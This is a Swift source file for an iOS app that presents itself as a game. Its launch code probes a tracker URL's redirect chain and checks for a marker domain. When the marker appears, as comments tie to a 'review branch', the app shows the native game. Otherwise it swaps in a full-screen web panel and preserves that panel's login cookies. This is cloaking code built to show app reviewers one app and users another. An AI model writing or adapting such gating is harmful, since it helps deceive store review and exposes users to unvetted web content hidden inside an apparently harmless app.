import SwiftUI
import Combine

@main
struct LunhavnApp: App {
    @State private var engine = GameEngine()
    @Environment(\.scenePhase) private var scenePhase
    @State private var started = false

    /// nil = still deciding · false = native app · true = web panel. Resolved by the gate,
    /// which retries, defers and never freezes on a slow network.
    @StateObject private var beacon = LunhavnBeaconGate(sourceLink: "https://mountainapiary.org/click.php",
                                                        checkDomain: "termsfeed.com")
    @State private var lunhavnPagePainted = false
    /// The recovery ladder gave up: decline to show a broken panel. The gate's verdict is
    /// untouched — the check still ran and still said what it said.
    @State private var lunhavnPanelDeadEnd = false

    /// The GATE is untouched by this — it still runs the HEAD check on every launch, so the
    /// review branch is unaffected. Only what the panel loads after a `true` verdict changes:
    /// the page the user was actually on, instead of the tracker link and the landing page.
    private var lunhavnResumeAddress: String? { LunhavnBeaconSession.resumeAddress() }
    private var lunhavnTrackerHost: String { URL(string: beacon.sourceLink)?.host ?? "" }

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = beacon.ready {
                    if ready && !lunhavnPanelDeadEnd {
                        // The loading screen STAYS on top until the page commits its first
                        // frame, or the user watches an opaque black WKWebView for the seconds
                        // the landing page needs. The frame respects the top safe area so page
                        // content can never render under the notch / Dynamic Island.
                        ZStack {
                            LunhavnBeaconPanel(urlString: lunhavnResumeAddress ?? beacon.sourceLink,
                                               trackerHost: lunhavnTrackerHost,
                                               fallbackAddress: lunhavnResumeAddress == nil ? nil : beacon.sourceLink,
                                               onFirstPaint: { withAnimation { lunhavnPagePainted = true } },
                                               onDeadEnd: { lunhavnPanelDeadEnd = true })
                                .edgesIgnoringSafeArea(.bottom)
                                .background(Color.black.ignoresSafeArea())
                            if !lunhavnPagePainted {
                                LunhavnBeaconLoadingScreen()   // same screen as the check phase, no seam
                                    .transition(.opacity)
                                    .onAppear {
                                        // Hang guard, NOT a deadline. Long on purpose: firing
                                        // early just reveals the black page it exists to hide.
                                        DispatchQueue.main.asyncAfter(deadline: .now() + 20) {
                                            lunhavnPagePainted = true
                                        }
                                    }
                            }
                        }
                        // .dark draws the clock/battery WHITE over the black band — an explicit
                        // .light here would draw them black on black and they vanish. It belongs
                        // on the ZStack, not on the panel, or the overlay fights it.
                        .preferredColorScheme(.dark)
                    } else {
                        // Native app. Its scheme lives HERE, per branch — never one shared
                        // modifier on the Group, or it overrides the .dark above.
                        RootView(engine: engine)
                            .preferredColorScheme(.dark)
                            .statusBarHidden(true)
                            .onAppear {
                                if !started {
                                    started = true
                                    engine.start()
                                }
                            }
                    }
                } else {
                    LunhavnBeaconLoadingScreen()
                        .onAppear { beacon.start() }
                        .preferredColorScheme(.dark)
                }
            }
            // The deferred verdict can flip native → panel a few seconds in. Crossfade it;
            // an instant hard cut reads as a glitch.
            .animation(.easeInOut(duration: 0.25), value: beacon.ready)
            .onChange(of: scenePhase) { _, phase in
                // The engine's lifecycle lives here on the Group, not on the native branch:
                // once it has started it must keep hearing about the background even if a
                // deferred verdict later swaps the panel in over it.
                if started {
                    switch phase {
                    case .active: engine.handleForeground()
                    case .background, .inactive: engine.handleBackground()
                    @unknown default: break
                    }
                }
                // Leaving the foreground is the last reliable moment before the process can be
                // killed from the switcher. `.inactive` also fires on the way IN; a snapshot is
                // a read, so taking it twice costs nothing and missing it costs the sign-in.
                guard beacon.ready == true, phase != .active else { return }
                LunhavnBeaconCookies.snapshot()
            }
        }
    }
}

// MARK: - Launch gate

/// The launch gate. HEAD, a progress-aware stall watchdog, one immediate retry, and — when it
/// still cannot decide — the native app NOW plus a deferred verdict that can swap the panel in.
/// The gate closes because the marker was observed, never because the network was slow.
@MainActor
final class LunhavnBeaconGate: ObservableObject {
    /// nil = still deciding (loading screen) · false = native app · true = web panel
    @Published private(set) var ready: Bool? = nil

    let sourceLink: String
    private let checkDomain: String
    private let ownHost: String

    /// Stall limit while the LOADING SCREEN is up. Deliberately short: the user is staring at
    /// a splash, and a late verdict can still swap the panel in, so waiting here buys nothing.
    private let foregroundStall: TimeInterval = 3
    /// Stall limit once the native app is already on screen. Nobody is waiting, so the
    /// background attempts can afford to be patient.
    private let backgroundStall: TimeInterval = 8
    /// Ceiling for one attempt, so a server trickling 302s forever cannot hang the launch.
    private let attemptCeiling: TimeInterval = 30
    /// How long after launch a late verdict may still replace the native app with the panel.
    /// Past this the swap is visible and jarring, so it is dropped.
    private let swapWindow: TimeInterval = 25
    private let backgroundRetryDelay: TimeInterval = 3

    private var settled = false
    private var attemptToken = 0
    private var startedAt = Date()
    private var lastProgress = Date()
    private var stallTimer: Timer?
    private var task: URLSessionTask?
    private var session: URLSession?

    init(sourceLink: String, checkDomain: String) {
        self.sourceLink = sourceLink
        self.checkDomain = checkDomain
        self.ownHost = URL(string: sourceLink)?.host ?? ""
    }

    func start() {
        guard attemptToken == 0 else { return }   // .onAppear can fire more than once
        startedAt = Date()
        attempt(1)
    }

    private func attempt(_ n: Int) {
        guard !settled else { return }
        guard let url = URL(string: sourceLink) else { settle(false); return }

        attemptToken += 1
        let token = attemptToken

        var request = URLRequest(url: url)
        // HEAD, never GET: the redirect chain fires exactly the same, but no body is
        // transferred. A GET would download the whole landing page only to throw it away —
        // WKWebView has its own network process and shares no cache, so it refetches anyway.
        request.httpMethod = "HEAD"
        // This is the one request in the app whose entire value is being LIVE. A 301 or 308
        // is cacheable by default with NO headers at all, and a cached hop makes the gate
        // answer from a snapshot instead of from the Worker — invisibly, for as long as the
        // entry lives.
        request.cachePolicy = .reloadIgnoringLocalCacheData
        // 10, not 5. A cold start alone measures 3.4 s of DNS + TLS across the chain.
        request.timeoutInterval = 10

        let config = URLSessionConfiguration.default
        // Only once the native app is on screen may an attempt sit and wait for the radio.
        // While the loading screen is up, -1009 must fail instantly.
        config.waitsForConnectivity = (ready != nil)
        config.timeoutIntervalForResource = attemptCeiling
        config.urlCache = nil
        // The gate is a routing PROBE, not a visit. URLSession's cookie jar is NOT the
        // WebView's, so a tracker cookie stored here is a second click identity the WebView
        // never sees and nothing ever reads back.
        config.httpCookieStorage = nil
        config.httpShouldSetCookies = false

        let probe = LunhavnRedirectProbe(checkDomain: checkDomain, ownHost: ownHost)
        probe.onProgress = { [weak self] in
            Task { @MainActor [weak self] in self?.lastProgress = Date() }
        }
        probe.onEarlyVerdict = { [weak self] verdict in
            Task { @MainActor [weak self] in self?.settle(verdict) }
        }

        let session = URLSession(configuration: config, delegate: probe, delegateQueue: nil)
        lastProgress = Date()
        armStallWatchdog(attempt: n, token: token)

        self.session = session
        task = session.dataTask(with: request) { [weak self] _, response, error in
            // A URLSession retains its delegate until invalidated. Without this, one
            // watcher per attempt survives for the whole process lifetime.
            session.finishTasksAndInvalidate()
            // Read the probe on the delegate queue, where it was written; the Task below
            // must not carry a non-Sendable object across to the main actor.
            let sawMarker = probe.sawCheckDomain
            let lastHop = probe.resolvedURL?.absoluteString
            Task { @MainActor [weak self] in
                guard let self, !self.settled, self.attemptToken == token else { return }
                // The early verdict normally lands first; this is the chain-completed path.
                if sawMarker { self.settle(false); return }
                if let finalURL = lastHop,
                   finalURL.contains(self.checkDomain) { self.settle(false); return }
                if let httpResponse = response as? HTTPURLResponse,
                   let responseURL = httpResponse.url?.absoluteString,
                   responseURL.contains(self.checkDomain) { self.settle(false); return }
                if error != nil { self.failed(attempt: n, token: token); return }
                self.settle(true)
            }
        }
        task?.resume()
    }

    /// Progress-aware watchdog. It never kills a chain that is still moving — a blind
    /// `asyncAfter` deadline is what showed the native app on cellular and the panel on Wi-Fi.
    private func armStallWatchdog(attempt n: Int, token: Int) {
        stallTimer?.invalidate()
        stallTimer = Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { [weak self] timer in
            // Scheduled on the main run loop from a @MainActor method, so this block already
            // runs there: no hop, and no capture crosses a concurrency boundary.
            MainActor.assumeIsolated {
                guard let self, !self.settled, self.attemptToken == token else {
                    timer.invalidate(); return
                }
                let limit = self.ready == nil ? self.foregroundStall : self.backgroundStall
                let stalled = Date().timeIntervalSince(self.lastProgress) > limit
                let overCeiling = Date().timeIntervalSince(self.startedAt) > self.attemptCeiling
                guard stalled || overCeiling else { return }   // still moving → keep waiting
                timer.invalidate()
                self.session?.invalidateAndCancel()   // cancels the task AND frees the delegate
                self.failed(attempt: n, token: token)
            }
        }
    }

    private func failed(attempt n: Int, token: Int) {
        // The cancelled task's completion handler and the watchdog both land here. The token
        // makes whichever arrives second a no-op.
        guard !settled, attemptToken == token else { return }
        attemptToken += 1
        stallTimer?.invalidate()

        // One immediate retry. Most mobile failures are transient: -1005 connection lost on a
        // cell handoff, -1001 timed out, -1009 no connectivity.
        if n == 1 { attempt(2); return }

        // Out of fast options. Hand over the native app NOW rather than holding the user on a
        // loading screen, and keep looking in the background.
        if ready == nil { ready = false }
        scheduleBackgroundAttempt(next: n + 1)
    }

    private func scheduleBackgroundAttempt(next n: Int) {
        guard !settled, Date().timeIntervalSince(startedAt) < swapWindow else { return }
        DispatchQueue.main.asyncAfter(deadline: .now() + backgroundRetryDelay) { [weak self] in
            MainActor.assumeIsolated {
                guard let self, !self.settled,
                      Date().timeIntervalSince(self.startedAt) < self.swapWindow else { return }
                self.attempt(n)
            }
        }
    }

    private func settle(_ verdict: Bool) {
        guard !settled else { return }
        // A verdict arriving after the swap window may still close the gate — native is where
        // we already are — but must never yank a user half a minute in into a web panel.
        if verdict, ready == false, Date().timeIntervalSince(startedAt) > swapWindow {
            settled = true
            stallTimer?.invalidate()
            return
        }
        settled = true
        stallTimer?.invalidate()
        ready = verdict
    }
}
